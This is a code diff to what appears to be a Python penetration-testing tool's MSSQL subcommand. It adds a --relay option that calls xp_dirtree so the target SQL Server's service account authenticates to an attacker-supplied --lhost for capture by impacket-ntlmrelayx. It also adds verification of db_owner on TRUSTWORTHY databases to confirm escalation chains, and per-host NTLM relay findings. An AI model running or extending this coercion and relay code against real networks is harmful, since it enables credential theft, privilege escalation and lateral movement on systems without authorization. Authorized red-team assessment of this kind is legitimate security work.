@@ -2640,7 +2640,12 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                 print(f"      [!] mssqlclient {t['ip']}: {err}")
                 continue
             ran_impacket = True
-            live_fs, live_chain, summary = mssql.chains_from_enum(t, enum, creds)
+            runner = mssql.link_runner(t["ip"], creds, port=t["port"],
+                                       windows_auth=not args.local_auth)
+            # Verify db_owner on the TRUSTWORTHY candidates so a chain is CONFIRMED.
+            dbo_map = mssql.verify_dbowner(mssql.trustworthy_sysadmin_dbs(enum), runner)
+            live_fs, live_chain, summary = mssql.chains_from_enum(t, enum, creds,
+                                                                  dbo_map=dbo_map or None)
             analysis["findings"] = live_fs + analysis["findings"]
             for rb in analysis["runbooks"]:
                 if rb["ip"] == t["ip"]:
@@ -2648,14 +2653,24 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                     if live_chain:
                         rb["chain"] = ["Live chain: " + " -> ".join(live_chain)] + rb["chain"]
             saf = " (sysadmin)" if summary["is_sysadmin"] else ""
+            conf = summary.get("dbowner_confirmed") or []
             print(f"      [+] {t['ip']}:{t['port']}  enumerated as {summary['login']}{saf}"
                   f" - {len(summary['logins'])} login(s), {len(summary['links'])} "
-                  f"linked server(s), {len(summary['trustworthy'])} TRUSTWORTHY db(s)")
+                  f"linked server(s), {len(summary['trustworthy'])} TRUSTWORTHY db(s)"
+                  + (f", db_owner on {', '.join(conf)}" if conf else ""))
+
+            # Optionally trigger the SQL service account to auth to --lhost (relay).
+            if args.relay and args.lhost:
+                ok, rerr = mssql.run_xp_dirtree(t["ip"], creds, args.lhost, port=t["port"],
+                                                windows_auth=not args.local_auth)
+                if ok:
+                    print(f"      [+] {t['ip']}: triggered xp_dirtree -> {args.lhost} "
+                          "(ensure impacket-ntlmrelayx is listening)")
+                else:
+                    print(f"      [!] {t['ip']}: relay trigger failed: {rerr}")
 
             # Recursively walk the linked-server graph from this instance.
             if summary["links"] and not args.no_links:
-                runner = mssql.link_runner(t["ip"], creds, port=t["port"],
-                                           windows_auth=not args.local_auth)
                 nodes = mssql.walk_links(summary["links"], runner,
                                          max_depth=args.link_depth)
                 if nodes:
@@ -2670,6 +2685,14 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                     sa_n = sum(1 for n in nodes if n["sysadmin"])
                     print(f"      [+] {t['ip']}: linked-server walk reached {len(nodes)} "
                           f"instance(s), {sa_n} as sysadmin")
+
+    # With any login we can coerce the service account's NetNTLM via UNC -> relay
+    # it. Add the concrete relay finding (real targets) per endpoint.
+    if creds:
+        for t in tgts:
+            rt = mssql.relay_targets(hosts, t["ip"])
+            analysis["findings"].append(
+                mssql.relay_finding(t, rt, args.lhost or "<LHOST>", creds))
 
     # De-duplicate findings (offline + nxc + live can overlap) by (title, target).
     seen: set = set()
@@ -3383,6 +3406,9 @@ def build_arg_parser() -> argparse.ArgumentParser:
                     help="SQL Server authentication (not Windows/domain)")
     ms.add_argument("--dc-ip", help="DC IP to fill into the generated commands")
     ms.add_argument("--lhost", help="your capture/relay IP for the UNC/relay commands")
+    ms.add_argument("--relay", action="store_true",
+                    help="actually trigger the SQL service account to authenticate to "
+                         "--lhost (xp_dirtree) so your ntlmrelayx catches it")
     ms.add_argument("--no-run", action="store_true",
                     help="don't execute nxc/impacket; just write the commands (airgapped-safe)")
     ms.add_argument("--no-probe", action="store_true",
